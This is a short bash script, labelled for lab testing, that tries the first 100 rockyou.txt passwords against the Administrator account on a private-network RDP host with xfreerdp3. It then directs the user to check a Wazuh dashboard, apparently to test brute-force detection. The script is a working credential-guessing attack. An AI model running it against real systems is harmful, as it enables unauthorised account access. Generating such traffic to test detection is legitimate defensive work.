#!/bin/bash
# RDP Brute Force Attack Simulation Script (For Lab Testing Only)

echo "Starting RDP brute force simulation against target..."

for pass in $(head -100 /usr/share/wordlists/rockyou.txt); do
  xfreerdp3 /v:10.0.2.3 /u:Administrator /p:"$pass" /cert:ignore +auth-only 2>&1 | grep -i "authentication\|error"
done

echo "Simulation completed. Check Wazuh dashboard for logs."
